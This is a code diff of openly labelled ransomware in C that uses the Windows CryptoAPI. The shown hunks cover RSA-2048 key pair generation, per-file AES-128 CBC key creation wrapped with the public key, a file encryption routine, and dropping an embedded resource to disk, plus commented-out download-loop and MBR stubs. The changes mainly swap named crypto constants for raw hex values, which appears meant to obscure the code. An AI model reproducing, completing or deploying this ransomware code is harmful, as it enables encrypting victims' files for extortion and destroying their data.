@@ -9,7 +9,6 @@ ive made a mini demo for the router so ill release that soon
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #define _CRT_SECURE_NO_DEPRECATE
 #pragma warning( disable: 4995 )
-//shitty fucking sprintf warning
 #define _UNICODE
 #define UNICODE
 #include <stdio.h>
@@ -221,7 +220,7 @@ HCRYPTKEY import_rsa_key(HCRYPTPROV prov, const char *file) {
 	FILE *filetoopen = fopen(file, "rb");
 	if (filetoopen != NULL) {
 		lol = fread(twentyfortyeight, 1, 2048, filetoopen);
-		if (!CryptImportKey(prov, twentyfortyeight, lol, 0, CRYPT_EXPORTABLE, &encryptedkeyholder)) {
+		if (!CryptImportKey(prov, twentyfortyeight, lol, 0, 0x00000001, &encryptedkeyholder)) {
 		}
 		fclose(filetoopen);
 	}
@@ -278,10 +277,10 @@ void dumpthersakey(HCRYPTPROV hcryptkeyprov, HCRYPTKEY ransomware_rsakey, const 
 void generateRSAkeys() {
 	HCRYPTPROV hcryptprov;
 	HCRYPTKEY  hcryptkey;
-	if (CryptAcquireContext(&hcryptprov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
-		if (CryptGenKey(hcryptprov, 1, (2048 << 16) | CRYPT_EXPORTABLE, &hcryptkey)) {
-			dumpthersakey(hcryptprov, hcryptkey, "public.memes", PUBLICKEYBLOB, FALSE);
-			dumpthersakey(hcryptprov, hcryptkey, "private.memes", PRIVATEKEYBLOB, TRUE); //encrypted private key
+	if (CryptAcquireContext(&hcryptprov, NULL, NULL, 24, 0xF0000000)) {
+		if (CryptGenKey(hcryptprov, 1, (2048 << 16) | 0x00000001, &hcryptkey)) {
+			dumpthersakey(hcryptprov, hcryptkey, "public.memes", 0x6, FALSE);
+			dumpthersakey(hcryptprov, hcryptkey, "private.memes", 0x7, TRUE); //encrypted private key
 			CryptDestroyKey(hcryptkey);
 		}
 		CryptReleaseContext(hcryptprov, 0);
@@ -298,7 +297,7 @@ encryptedaes* generateAESKEY(HCRYPTPROV again, HCRYPTKEY rsakey, const char *ope
 	{
 		infile = fopen(openfile, "rb");
 		if (infile != NULL) {
-			fseek(infile, 15 + sizeof(uint32_t), SEEK_SET);
+			fseek(infile, 15 + sizeof(uint32_t), 0);
 			/*
 			this is just a refernce ^^
 			// this will hold the encrypted AES key after
@@ -324,14 +323,14 @@ encryptedaes* generateAESKEY(HCRYPTPROV again, HCRYPTKEY rsakey, const char *ope
 			return 0;
 		}
 	}
-	key.publickeystruc.bType = PLAINTEXTKEYBLOB;
-	key.publickeystruc.bVersion = CUR_BLOB_VERSION;
+	key.publickeystruc.bType = 0x8;
+	key.publickeystruc.bVersion = 2;
 	key.publickeystruc.reserved = 0;
 	key.publickeystruc.aiKeyAlg = CALG_AES_128;
 	key.lol = 16;
-	if (CryptImportKey(again, (PBYTE)&key, sizeof(key), 0, CRYPT_NO_SALT, &encryptedaeskey->aesencryptedkey)) {
+	if (CryptImportKey(again, (PBYTE)&key, sizeof(key), 0, 0x00000010, &encryptedaeskey->aesencryptedkey)) {
 		//cbc encryption mode... not going to use ECB :D
-		encryptionmode = CRYPT_MODE_CBC;
+		encryptionmode = 1;
 		CryptSetKeyParam(encryptedaeskey->aesencryptedkey, 4, (PBYTE)&encryptionmode, 0);
 	}
 	return encryptedaeskey;
@@ -388,7 +387,7 @@ void fileencryption(const char *infile, int encryptionmode) {
 	HCRYPTPROV hcryptprov = 0;
 	HCRYPTKEY  rsakey = 0;
 	char *key_file;
-	if (CryptAcquireContext(&hcryptprov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+	if (CryptAcquireContext(&hcryptprov, NULL, NULL, 24, 0xF0000000)) {
 		key_file = "public.memes";
 		rsakey = import_rsa_key(hcryptprov, key_file);
 		if (rsakey != 0) {
@@ -404,7 +403,7 @@ void fuckdaddy(WORD period, LPTSTR periodblood)
 	HGLOBAL eminemisagod = LoadResource(NULL, periodpad);
 	LPVOID legsgiveout = LockResource(eminemisagod);
 	DWORD eatanmcsheart = SizeofResource(NULL, periodpad);
-	HANDLE checkmymouth = CreateFile(periodblood, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE checkmymouth = CreateFile(periodblood, GENERIC_WRITE, 0, NULL, 2, 0x00000080, NULL);
 	DWORD daddyinthecorner;
 	WriteFile(checkmymouth, legsgiveout, eatanmcsheart, &daddyinthecorner, NULL);
 	CloseHandle(checkmymouth);
@@ -481,17 +480,17 @@ int main() {
 	//just generate them on the client side... this is not good :|
 
 	/*if this failes exit the process and go to self delete exe?
-		}
+	}
 	if (intconnected) {
-		while (downloadfile() != true) {
-	meh if u want to make a download :\ 	
-		downloadfile();
+	while (downloadfile() != true) {
+	meh if u want to make a download :\
+	downloadfile();
 	1000 milliseconds in 1 second? thanks physics ;) :D
 	every 2 minutes :P
-		Sleep(120000);
-		}
+	Sleep(120000);
+	}
 	download the keys
-		}
+	}
 	//ugh removed a function :P dont worry about this
 	//mbr();
 	*/
